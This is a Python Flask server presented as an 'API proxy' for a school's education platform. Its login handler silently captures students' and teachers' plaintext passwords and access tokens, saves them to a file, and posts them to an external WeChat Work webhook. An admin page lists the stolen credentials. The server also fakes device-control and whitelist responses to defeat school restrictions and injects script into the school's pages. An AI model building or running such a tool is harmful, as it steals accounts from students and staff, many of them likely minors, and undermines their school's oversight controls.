from flask import Flask, request, Response, jsonify, stream_with_context
import requests
import time
import json
from pathlib import Path
from functools import wraps
from flask_cors import CORS
from flask import Response

# 在这里配置管理员账号密码
ADMIN_USERNAME = "loshop"
ADMIN_PASSWORD = "wumama"


def check_auth(username, password):
    """验证用户名和密码"""
    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD


def authenticate():
    """返回 401 让浏览器弹窗"""
    return Response(
        "需要管理员权限访问此页面",
        401,
        {"WWW-Authenticate": 'Basic realm="Login Required"'},
    )


def requires_auth(f):
    """装饰器：保护路由"""

    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)

    return decorated


app = Flask(__name__)
CORS(app, resources={r"/special/*": {"origins": "*"}})
TARGET_DOMAIN = "sxz.api.zykj.org"
TARGET_URL = f"http://{TARGET_DOMAIN}"

SPECIAL_PATH = "/api/services/app/CtrlStrategy/GetControlPolicyByDeviceNumberAsync"
BLOCK_PATH_PREFIX = "/services/app/[WebWhiteList]/"

PRESET_RESPONSE = {
    "result": {"type": 4, "policies": []},
    "targetUrl": None,
    "success": True,
    "error": None,
    "unAuthorizedRequest": False,
    "__abp": True,
}

BLOCKED_RESPONSE = {
    "success": False,
    "error": {"code": 403, "message": "访问被禁止", "details": "该接口已禁用"},
    "__abp": True,
}

DISCOVERY_RESPONSE = {
    "name": "江苏省锡中",
    "server": "http://sxz.api.zykj.org",
    "lcid": "6ee30ace-f3c3-4ed0-a1b8-ce2855c9eb99",
}


def modify_request_body(original_data, content_type):
    processable_types = [
        "application/json",
        "text/plain",
        "application/xml",
        "text/xml",
        "application/x-www-form-urlencoded",
        "text/html",
    ]
    if not any(content_type.startswith(t) for t in processable_types):
        return original_data, False
    try:
        charset = "utf-8"
        if "charset=" in content_type:
            charset = content_type.split("charset=")[1].split(";")[0].strip().lower()
        decoded = original_data.decode(charset)
        modified = decoded
        return modified.encode(charset), True
    except Exception as e:
        print(f"请求体修改失败: {str(e)}")
        return original_data, False


@app.before_request
def before_request():
    request.start_time = time.time()
    raw_data = request.get_data(cache=False)
    content_type = request.headers.get("Content-Type", "")
    modified_data, is_modified = modify_request_body(raw_data, content_type)
    request.modified_data = modified_data
    request.is_modified = is_modified
    request._cached_data = modified_data


def log_request(response):
    duration = (
        (time.time() - request.start_time) * 1000
        if hasattr(request, "start_time")
        else 0
    )
    status = "已拦截" if getattr(response, "is_blocked", False) else "已代理"
    log_msg = [
        f"\n{'='*40} 请求日志 {'='*40}",
        f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {request.method} {request.path}",
        f"状态: {status} | 耗时: {duration:.2f}ms | 状态码: {response.status_code}",
    ]
    if status == "已拦截":
        log_msg.append("拦截原因: " + getattr(response, "block_reason", "未指明原因"))
    print("\n".join(log_msg))


def check_duplicate_login(username, password):
    log_file = Path("user.txt")
    if not log_file.exists():
        return False

    try:
        with open(log_file, "r", encoding="utf-8") as f:
            content = f.read()

        records = content.split("-" * 50)

        for record in records:
            if not record.strip():
                continue

            record_lines = [
                line.strip() for line in record.strip().split("\n") if line.strip()
            ]
            record_username = None
            record_password = None

            for line in record_lines:
                if line.startswith("用户名: "):
                    record_username = line.split("用户名: ")[1].strip()
                elif line.startswith("密码: "):
                    record_password = line.split("密码: ")[1].strip()

            if record_username == username and record_password == password:
                return True

        return False
    except Exception as e:
        print(f"检查重复记录失败: {str(e)}")
        return False


def send_markdown(cnt):
    headers = {"Content-Type": "text/plain"}
    send_url = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=e42278d0-26da-4a58-b488-456e07927430"
    send_data = {
        "msgtype": "markdown",  # 消息类型，此时固定为markdown
        "markdown": {"content": cnt},
    }

    res = requests.post(url=send_url, headers=headers, json=send_data)
    print(res.text)


def log_login_credentials(data, response_data=None):
    try:
        login_info = json.loads(data)
        username = login_info.get("userName", "未知用户名")
        password = login_info.get("password", "未知密码")
        client_type = login_info.get("clientType", "未知客户端类型")

        login_success = False
        user_id = None
        access_token = None

        if response_data:
            try:
                resp_json = json.loads(response_data)
                login_success = resp_json.get("success", False)

                if login_success and "result" in resp_json:
                    result = resp_json["result"]
                    user_id = result.get("userId")
                    access_token = result.get("accessToken")

            except json.JSONDecodeError:
                print("警告: 无法解析登录响应JSON")

        if not login_success:
            print(f"登录失败，用户名: {username}，已跳过记录")
            return

        if username[0] != "2":
            send_markdown(
                f"""# 有非学生账号登录，很可能是教师账号
> **用户名**: <font color="info">{username}</font>
> **时间**: {time.strftime('%Y-%m-%d %H:%M:%S')}

<@吴翌轩>"""
            )

        if check_duplicate_login(username, password):
            print(f"\n用户名 {username} 的登录信息未变化，已跳过重复记录")

            send_markdown(
                f"""
# 捕获登录信息
> **用户名**: <font color="info">{username}</font>
> **密码**: <font color="warning">{password}</font>
> **客户端类型**: {client_type}
> **登录结果**: 成功
> **用户ID**: {user_id}
> **时间**: {time.strftime('%Y-%m-%d %H:%M:%S')}"""
            )
            return

        print(f"\n{'='*20} 捕获登录信息 {'='*20}")
        print(f"用户名: {username}")
        print(f"密码: {password}")
        print(f"客户端类型: {client_type}")
        print(f"登录结果: 成功")
        print(f"用户ID: {user_id}")
        print(f"访问令牌: {access_token}")
        print(f"时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*50}\n")
        send_markdown(
            f"""
# 捕获登录信息
> **用户名**: <font color="info">{username}</font>
> **密码**: <font color="warning">{password}</font>
> **客户端类型**: {client_type}
> **登录结果**: 成功
> **用户ID**: {user_id}
> **时间**: {time.strftime('%Y-%m-%d %H:%M:%S')}"""
        )

        log_entry = (
            f"时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"用户名: {username}\n"
            f"密码: {password}\n"
            f"客户端类型: {client_type}\n"
            f"登录结果: 成功\n"
            f"用户ID: {user_id}\n"
            f"访问令牌: {access_token[:30]}... (已截断)\n"
            f"{'-'*50}\n"
        )

        with open("user.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)

    except Exception as e:
        print(f"记录登录信息失败: {str(e)}")


@app.route("/navPage.html", methods=["GET"])
def nav_page():
    target_url = "http://sxz.school.zykj.org/navPage.html"

    try:
        # 获取原始的 navPage.html 内容
        resp = requests.get(target_url)
        resp.raise_for_status()

        # 获取响应内容
        content = resp.text

        # 注入自定义 JavaScript 来覆盖 window.open
        injected_js = """<script>
        
const prefix = 'https://zyapi.loshop.com.cn/picAgent/';

function processMedia() {
    const mediaWraps = document.querySelectorAll('.media-wrap');

    mediaWraps.forEach(wrapper => {
        // 处理 <img>
        const imgs = wrapper.querySelectorAll('img');
        imgs.forEach(img => {
            if (img.src && !img.src.startsWith(prefix)) {
                img.src = prefix + encodeURIComponent(img.src);
            }
        });

        // 处理 <video>
        const videos = wrapper.querySelectorAll('video');
        videos.forEach(video => {
            if (video.src && !video.src.startsWith(prefix)) {
                video.src = prefix + encodeURIComponent(video.src);
            }

            // 处理 <source> 标签
            const sources = video.querySelectorAll('source');
            sources.forEach(source => {
                if (source.src && !source.src.startsWith(prefix)) {
                    source.src = prefix + encodeURIComponent(source.src);
                }
            });
        });
    });
}

setInterval(processMedia, 1000);
const originalWindowOpen = window.open;
window.open = function(url, ...args) {
    const decodedUrl = decodeURIComponent(url);
    const modifiedUrl = `https://zyapi.loshop.com.cn/picAgent/${encodeURIComponent(decodedUrl)}`;

    // 创建遮罩层
    const overlay = document.createElement('div');
    overlay.style.position = 'fixed';
    overlay.style.top = '0';
    overlay.style.left = '0';
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0,0,0,0.5)';
    overlay.style.display = 'flex';
    overlay.style.flexDirection = 'column';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    overlay.style.zIndex = '9999';
    overlay.style.gap = '20px';

    // 按钮容器
    const btnContainer = document.createElement('div');
    btnContainer.style.backgroundColor = '#fff';
    btnContainer.style.padding = '20px 30px';
    btnContainer.style.borderRadius = '10px';
    btnContainer.style.display = 'flex';
    btnContainer.style.gap = '10px';
    btnContainer.style.width = '90%';
    btnContainer.style.maxWidth = '400px';
    btnContainer.style.boxShadow = '0 4px 10px rgba(0,0,0,0.3)';

    function createButton(text, color) {
        const btn = document.createElement('button');
        btn.innerText = text;
        btn.style.flex = '1';
        btn.style.padding = '12px';
        btn.style.cursor = 'pointer';
        btn.style.backgroundColor = color;
        btn.style.color = 'white';
        btn.style.border = 'none';
        btn.style.borderRadius = '5px';
        btn.style.fontSize = '16px';
        return btn;
    }

    const downloadBtn = createButton('下载', '#4caf50');
    const previewBtn = createButton('预览', '#2196f3');
    const cancelBtn = createButton('取消', '#999');

    btnContainer.appendChild(downloadBtn);
    btnContainer.appendChild(previewBtn);
    btnContainer.appendChild(cancelBtn);
    overlay.appendChild(btnContainer);

    // 创建进度条
    const progressContainer = document.createElement('div');
    progressContainer.style.width = '90%';
    progressContainer.style.maxWidth = '400px';
    progressContainer.style.height = '20px';
    progressContainer.style.backgroundColor = '#eee';
    progressContainer.style.borderRadius = '10px';
    progressContainer.style.overflow = 'hidden';
    progressContainer.style.display = 'none';
    const progressBar = document.createElement('div');
    progressBar.style.width = '0%';
    progressBar.style.height = '100%';
    progressBar.style.backgroundColor = '#4caf50';
    progressContainer.appendChild(progressBar);
    overlay.appendChild(progressContainer);

    document.body.appendChild(overlay);

    // 下载逻辑
    downloadBtn.onclick = function() {
        progressContainer.style.display = 'block';
        btnContainer.style.display = 'none';

        const xhr = new XMLHttpRequest();
        xhr.open('GET', modifiedUrl, true);
        xhr.responseType = 'blob';

        xhr.onprogress = function(e) {
            if (e.lengthComputable) {
                const percent = (e.loaded / e.total * 100).toFixed(2);
                progressBar.style.width = percent + '%';
            }
        };

        xhr.onload = function() {
            if (xhr.status === 200) {
                const blob = xhr.response;
                const a = document.createElement('a');
                const fileName = decodedUrl.split('/').pop();
                a.href = window.URL.createObjectURL(blob);
                a.download = fileName;
                a.click();
            } else {
                alert('下载失败: ' + xhr.status);
            }
            document.body.removeChild(overlay);
        };

        xhr.onerror = function() {
            alert('下载失败');
            document.body.removeChild(overlay);
        };

        xhr.send();
    };

    // 预览逻辑
    previewBtn.onclick = function() {
        const previewOverlay = document.createElement('div');
        previewOverlay.style.position = 'fixed';
        previewOverlay.style.top = '0';
        previewOverlay.style.left = '0';
        previewOverlay.style.width = '100%';
        previewOverlay.style.height = '100%';
        previewOverlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
        previewOverlay.style.zIndex = '10000';
        previewOverlay.style.display = 'flex';
        previewOverlay.style.justifyContent = 'center';
        previewOverlay.style.alignItems = 'center';

        const iframe = document.createElement('iframe');
        iframe.src = `https://gl.zytb.loshop.com.cn/web/viewer.html?file=${modifiedUrl}`;
        iframe.style.width = '90%';
        iframe.style.height = '90%';
        iframe.style.border = 'none';
        iframe.style.borderRadius = '8px';
        iframe.style.boxShadow = '0 4px 20px rgba(0,0,0,0.3)';

        const closeButton = document.createElement('button');
        closeButton.innerText = '关闭';
        closeButton.style.position = 'absolute';
        closeButton.style.top = '20px';
        closeButton.style.right = '20px';
        closeButton.style.padding = '10px';
        closeButton.style.backgroundColor = '#ff5c5c';
        closeButton.style.color = 'white';
        closeButton.style.border = 'none';
        closeButton.style.borderRadius = '5px';
        closeButton.style.cursor = 'pointer';
        closeButton.style.zIndex = '10001';
        closeButton.onclick = function() {
            document.body.removeChild(previewOverlay);
        };

        previewOverlay.appendChild(iframe);
        previewOverlay.appendChild(closeButton);
        document.body.appendChild(previewOverlay);

        document.body.removeChild(overlay);
    };

    // 取消逻辑
    cancelBtn.onclick = function() {
        document.body.removeChild(overlay);
    };
};
</script>

        """

        # 在 </body> 标签之前注入 JavaScript 代码
        content = content.replace("</body>", injected_js + "</body>")

        # 返回修改后的内容作为响应
        return Response(content, content_type="text/html")

    except requests.exceptions.RequestException as e:
        # 如果发生请求异常，返回错误信息
        return jsonify({"success": False, "error": f"代理请求失败: {str(e)}"}), 502



@app.route("/special/GetByParentId", methods=["GET", "POST", "OPTIONS"])
def special_get_by_parentid():
    if request.method == "OPTIONS":
        resp = Response()
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
        return resp

    def log_request(start_time, method, url, status_code, headers, error=None):
        duration = (time.time() - start_time) * 1000
        log_lines = [
            f"\n{'='*30} Request Log {'='*30}",
            f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Method: {method}",
            f"URL: {url}",
            f"Status Code: {status_code}",
            f"Duration: {duration:.2f}ms",
            f"Headers: {dict(headers)}",
        ]
        if error:
            log_lines.append(f"Error: {error}")
        print("\n".join(log_lines))

    start_time = time.time()
    try:
        # 拼接原始 URL（保留 query string）
        url = f"http://sxz.api.zykj.org/CloudNotes/api/Notes/GetByParentId"
        if request.query_string:
            url += f"?{request.query_string.decode('utf-8')}"

        # 原始 headers，保证 Authorization 完整
        headers = {k: v for k, v in request.headers.items()}
        headers.pop("Host", None)

        # GET 不带 body，POST 才带
        data = request.get_data() if request.method == "POST" else None

        resp = requests.request(
            method=request.method,
            url=url,
            headers=headers,
            data=data,
            cookies=request.cookies,
            allow_redirects=False,
            timeout=15,
        )

        response = Response(resp.content, resp.status_code)
        # 保留 headers（除 Content-Encoding/Transfer-Encoding）
        for k, v in resp.headers.items():
            if k.lower() not in ["content-encoding", "transfer-encoding"]:
                response.headers[k] = v

        # 记录日志
        log_request(start_time, request.method, url, resp.status_code, headers)
        return response

    except requests.exceptions.RequestException as e:
        log_request(start_time, request.method, url, 502, headers, error=str(e))
        return jsonify({"success": False, "error": f"代理请求失败: {str(e)}"}), 502


@app.route("/special/GetByFileId", methods=["GET", "POST", "OPTIONS"])
def special_get_by_fileid():
    if request.method == "OPTIONS":
        resp = Response()
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
        return resp

    def log_request(start_time, method, url, status_code, headers, error=None):
        duration = (time.time() - start_time) * 1000
        log_lines = [
            f"\n{'='*30} Request Log {'='*30}",
            f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Method: {method}",
            f"URL: {url}",
            f"Status Code: {status_code}",
            f"Duration: {duration:.2f}ms",
            f"Headers: {dict(headers)}",
        ]
        if error:
            log_lines.append(f"Error: {error}")
        print("\n".join(log_lines))

    start_time = time.time()
    try:
        # 拼接原始 URL（保留 query string）
        url = f"{TARGET_URL}/CloudNotes/api/Resources/GetByFileId"
        if request.query_string:
            url += f"?{request.query_string.decode('utf-8')}"

        # 原始 headers，保证 Authorization 完整
        headers = {k: v for k, v in request.headers.items()}
        headers.pop("Host", None)

        # GET 不带 body，POST 才带
        data = request.get_data() if request.method == "POST" else None

        resp = requests.request(
            method=request.method,
            url=url,
            headers=headers,
            data=data,
            cookies=request.cookies,
            allow_redirects=False,
            timeout=15,
        )

        response = Response(resp.content, resp.status_code)
        # 保留 headers（除 Content-Encoding/Transfer-Encoding）
        for k, v in resp.headers.items():
            if k.lower() not in ["content-encoding", "transfer-encoding"]:
                response.headers[k] = v

        # 记录日志
        log_request(start_time, request.method, url, resp.status_code, headers)
        return response

    except requests.exceptions.RequestException as e:
        log_request(start_time, request.method, url, 502, headers, error=str(e))
        return jsonify({"success": False, "error": f"代理请求失败: {str(e)}"}), 502


@app.route("/", methods=["GET"])
def home():
    return """
    <!DOCTYPE html>
    <html lang="zh-cn">
    <head>
        <meta charset="utf-8">
        <title>Loshop zy API</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded" rel="stylesheet" />
        <script type="module" src="https://unpkg.com/@material/web@1.0.0-rc.4/all.js"></script>
        <style>
            body {
                font-family: 'Roboto', Arial, sans-serif;
                background: #f5f5f5;
                margin: 0;
            }
            .mdc-card {
                max-width: 600px;
                margin: 48px auto 0 auto;
                padding: 32px 24px;
                background: #fff;
                border-radius: 18px;
                box-shadow: 0 2px 8px rgba(60,60,60,.11);
            }
            h1 {
                color: #181c23;
                font-size: 2.1rem;
                font-weight: 500;
                letter-spacing: .01em;
                margin-bottom: 16px;
            }
            ul {
                color: #444;
                margin-left: 18px;
            }
            .github-btn {
                margin-top: 22px;
                display: inline-flex;
                align-items: center;
                background: #0061a6;
                color: #fff;
                border-radius: 8px;
                padding: 10px 22px;
                text-decoration: none;
                font-weight: 500;
                font-size: 1rem;
                gap: 6px;
                box-shadow: 0 1px 3px rgba(0,0,0,.06);
                transition: background .2s;
            }
            .github-btn:hover {
                background: #003d6f;
            }
            .material-symbols-rounded {
                font-size: 1.3em;
                vertical-align: middle;
            }
        </style>
    </head>
    <body>
        <div class="mdc-card">
            <h1>
                <span class="material-symbols-rounded" style="color:#0061a6;">cloud</span>
                Loshop zy API
            </h1>
            <p>本项目是一个基于 Flask 的中育API代理。</p>
            <ul>
                <li>支持HTTPS</li>
            </ul>
            <a class="github-btn" href="https://github.com/BennyLoshop" target="_blank">
                <span class="material-symbols-rounded">star</span> GitHub 个人主页
            </a>
        </div>
    </body>
    </html>
    """


@app.route("/picAgent/<path:url>", methods=["GET", "OPTIONS"])
def proxy_stream(url):
    # OPTIONS 棰勬璇锋眰
    if request.method == "OPTIONS":
        resp = Response()
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = (
            "Authorization, Content-Type, Range"
        )
        return resp

    target_url = url if url.startswith(("http://", "https://")) else f"http://{url}"

    # 鏀寔 Range 璇锋眰
    headers = {}
    range_header = request.headers.get("Range")
    if range_header:
        headers["Range"] = range_header

    try:
        r = requests.get(target_url, headers=headers, stream=True, timeout=10)
        r.raise_for_status()

        content_type = r.headers.get("Content-Type", "application/octet-stream")
        content_length = r.headers.get("Content-Length")
        status_code = 206 if "Range" in headers else 200

        def generate():
            for chunk in r.iter_content(chunk_size=1024 * 1024):  # 姣忔 1MB
                if chunk:
                    yield chunk

        response = Response(
            stream_with_context(generate()), status=status_code, mimetype=content_type
        )
        # Range 鍝嶅簲澶�
        if "Content-Range" in r.headers:
            response.headers["Content-Range"] = r.headers["Content-Range"]
        if content_length:
            response.headers["Content-Length"] = content_length

        response.headers["Accept-Ranges"] = "bytes"
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = (
            "Authorization, Content-Type, Range"
        )
        return response

    except requests.exceptions.RequestException as e:
        response = Response(f"鑾峰彇璧勬簮澶辫触: {str(e)}", status=502)
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = (
            "Authorization, Content-Type, Range"
        )
        return response


@app.route(
    "/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
)
def proxy_api(path):
    if path == "api/TokenAuth/Login" and request.method == "POST":
        content_type = request.headers.get("Content-Type", "")
        request_data = None

        try:
            charset = "utf-8"
            if "charset=" in content_type:
                charset = (
                    content_type.split("charset=")[1].split(";")[0].strip().lower()
                )
            request_data = request.get_data().decode(charset)
        except Exception as e:
            print(f"解析登录请求体失败: {str(e)}")

        headers = {k: v for k, v in request.headers if k.lower() != "host"}
        headers["Host"] = TARGET_DOMAIN
        if "Content-Length" in headers and request.is_modified:
            headers["Content-Length"] = str(len(request.modified_data))

        try:
            resp = requests.request(
                method=request.method,
                url=f"{TARGET_URL}/{path}",
                headers=headers,
                data=request.modified_data,
                params=request.args,
                cookies=request.cookies,
                allow_redirects=False,
                timeout=10,
            )
        except requests.exceptions.RequestException as e:
            response = jsonify({"success": False, "error": f"代理请求失败: {str(e)}"})
            response.status_code = 502
            log_request(response)
            return response

        if request_data:
            try:
                response_data = resp.content.decode("utf-8", errors="ignore")
                log_login_credentials(request_data, response_data)
            except Exception as e:
                print(f"记录登录结果失败: {str(e)}")

        response = Response(resp.content, resp.status_code)
        response.headers.extend(
            {
                k: v
                for k, v in resp.headers.items()
                if k.lower() not in ["content-encoding", "transfer-encoding"]
            }
        )
        log_request(response)
        return response

    if path == "/api/discovery/sxz" and request.method == "GET":
        base_url = request.host_url.rstrip("/")
        resp = dict(DISCOVERY_RESPONSE)
        response = jsonify(resp)
        response.is_blocked = True
        response.block_reason = "发现接口拦截"
        log_request(response)
        return response

    if path.startswith(BLOCK_PATH_PREFIX.lstrip("/")):
        response = jsonify(BLOCKED_RESPONSE)
        response.status_code = 403
        response.is_blocked = True
        response.block_reason = "受保护接口范围"
        log_request(response)
        return response

    if path == SPECIAL_PATH.lstrip("/"):
        response = jsonify(PRESET_RESPONSE)
        response.headers["Content-Type"] = "application/json"
        response.is_blocked = True
        response.block_reason = "预设响应接口"
        log_request(response)
        return response

    headers = {k: v for k, v in request.headers if k.lower() != "host"}
    headers["Host"] = TARGET_DOMAIN
    if "Content-Length" in headers and request.is_modified:
        headers["Content-Length"] = str(len(request.modified_data))

    try:
        resp = requests.request(
            method=request.method,
            url=f"{TARGET_URL}/{path}",
            headers=headers,
            data=request.modified_data,
            params=request.args,
            cookies=request.cookies,
            allow_redirects=False,
            timeout=10,
        )
    except requests.exceptions.RequestException as e:
        response = jsonify({"success": False, "error": f"代理请求失败: {str(e)}"})
        response.status_code = 502
        log_request(response)
        return response

    response = Response(resp.content, resp.status_code)
    response.headers.extend(
        {
            k: v
            for k, v in resp.headers.items()
            if k.lower() not in ["content-encoding", "transfer-encoding"]
        }
    )
    log_request(response)
    return response


@app.route("/admin/xxx/users", methods=["GET"])
@requires_auth
def admin_users():
    log_file = Path("user.txt")
    if not log_file.exists():
        return "<h2>没有找到 user.txt 文件</h2>"

    try:
        with open(log_file, "r", encoding="utf-8") as f:
            content = f.read()

        records = content.split("-" * 50)
        user_map = {}  # key = 用户名, value = 数据dict（只保留最早的一条）
        for record in records:
            if not record.strip():
                continue
            record_lines = [
                line.strip() for line in record.strip().split("\n") if line.strip()
            ]
            user_data = {}
            for line in record_lines:
                if line.startswith("时间: "):
                    user_data["最早登录时间"] = line.split("时间: ")[1]
                elif line.startswith("用户名: "):
                    user_data["用户名"] = line.split("用户名: ")[1]
                elif line.startswith("密码: "):
                    user_data["密码"] = line.split("密码: ")[1]
                elif line.startswith("客户端类型: "):
                    user_data["客户端类型"] = line.split("客户端类型: ")[1]
                elif line.startswith("用户ID: "):
                    user_data["用户ID"] = line.split("用户ID: ")[1]

            username = user_data.get("用户名")
            if username and username not in user_map:
                # 只保留第一次出现的
                user_map[username] = user_data

        rows = list(user_map.values())

        html = """
        <!DOCTYPE html>
        <html lang="zh-cn">
        <head>
            <meta charset="utf-8">
            <title>用户记录</title>
            <style>
                body { font-family: Arial, sans-serif; background:#f5f5f5; padding:20px; }
                table { border-collapse: collapse; width: 100%; background:#fff; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background: #0061a6; color: white; }
                tr:nth-child(even) { background: #f9f9f9; }
                h1 { color:#333; }
            </style>
        </head>
        <body>
            <h1>用户记录</h1>
            <table>
                <thead>
                    <tr>
                        <th>最早登录时间</th>
                        <th>用户名</th>
                        <th>密码</th>
                        <th>客户端类型</th>
                        <th>用户ID</th>
                    </tr>
                </thead>
                <tbody>
        """
        for row in rows:
            html += "<tr>"
            html += f"<td>{row.get('最早登录时间','')}</td>"
            html += f"<td>{row.get('用户名','')}</td>"
            html += f"<td>{row.get('密码','')}</td>"
            html += f"<td>{row.get('客户端类型','')}</td>"
            html += f"<td>{row.get('用户ID','')}</td>"
            html += "</tr>"
        html += """
                </tbody>
            </table>
        </body>
        </html>
        """
        return html
    except Exception as e:
        return f"<h2>读取用户数据失败: {str(e)}</h2>"


@app.route("/discovery/sxz", methods=["GET"])
def discovery_sxz():
    base_url = request.host_url.rstrip("/")
    resp = dict(DISCOVERY_RESPONSE)
    resp["server"] = f"{base_url}/api"
    return jsonify(resp)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
